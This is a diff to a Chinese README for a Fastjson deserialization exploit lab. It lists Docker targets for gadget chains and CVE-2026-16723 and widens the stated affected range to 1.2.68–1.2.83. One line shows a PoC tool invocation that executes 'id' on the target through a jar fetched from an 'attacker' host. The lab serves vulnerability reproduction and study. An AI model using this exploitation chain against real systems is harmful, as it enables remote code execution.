@@ -9,7 +9,7 @@
 | ≤1.2.47 gadget | `fastjson-1247-lab` | `18247` | Class 缓存绕过 + 依赖链落盘证明 |
 | ≤1.2.68 gadget | `fastjson-1268-lab` | `18268` | AutoCloseable expectClass 落盘证明 |
 | ≤1.2.80 gadget | `fastjson-1280-lab` | `18280` | Exception 缓存绕过落盘证明 |
-| CVE-2026-16723 | `cve-2026-16723` | `18083` | 1.2.83 jar:http / fd-cache 证明 |
+| CVE-2026-16723 | `cve-2026-16723` | `18083` | 1.2.68–1.2.83；lab 用 1.2.83 jar:http / fd-cache |
 
 根目录 `docker-compose.yml` 只编排**指纹对照 + 版本矩阵**；gadget / CVE 靶场各自独立 compose。
 
@@ -166,7 +166,7 @@ cd lab/cve-2026-16723 && docker compose up --build -d
 
 ---
 
-## 6. cve-2026-16723 — Fastjson 1.2.83 Undertow
+## 6. cve-2026-16723 — Undertow（证明靶场：1.2.83）
 
 | 项 | 值 |
 |----|-----|
@@ -176,7 +176,7 @@ cd lab/cve-2026-16723 && docker compose up --build -d
 | JDWP | `18505` → 容器 `5005` |
 | JDK | Eclipse Temurin **8** JRE（`8u432`）；**须 JDK8**（11+ `defineClass` 拒连续 `/`） |
 | 框架 | Spring Boot 2.7 + **Undertow** fat jar（非 Tomcat） |
-| Fastjson | **1.2.83** |
+| Fastjson | **1.2.83**（证明用；CVE 官方范围为 **1.2.68–1.2.83**，不仅限于 83） |
 | extra_hosts | `attacker` / `host.docker.internal` → host-gateway |
 
 **作用**：复现 CVE-2026-16723（jar:http / jar:file / fd-cache）。必须用 **fat jar** 启动（TCCL=`LaunchedURLClassLoader`）；IDE 炸包 classpath 会失败。`jar:http` 主机名须无点号（用 `attacker`，勿用 `127.0.0.1`）。
@@ -203,6 +203,6 @@ fjtoolkit poc-16723 -u http://127.0.0.1:18083 -H attacker -e -c id --engine unde
 | ≤1.2.47 完整 gadget | `fastjson-1247-lab` `:18247`（不要用 `:18047`） |
 | ≤1.2.68 AutoCloseable | `fastjson-1268-lab` `:18268` |
 | ≤1.2.80 Exception 缓存 | `fastjson-1280-lab` `:18280` |
-| 1.2.83 jar:http / fd-cache | `cve-2026-16723` `:18083` |
+| CVE-2026-16723（1.2.68–1.2.83） | `cve-2026-16723` `:18083`（lab 用 1.2.83） |
 
 版本矩阵端口只有 Fastjson 本体；gadget 依赖与 JDK 约束见各子目录 README。
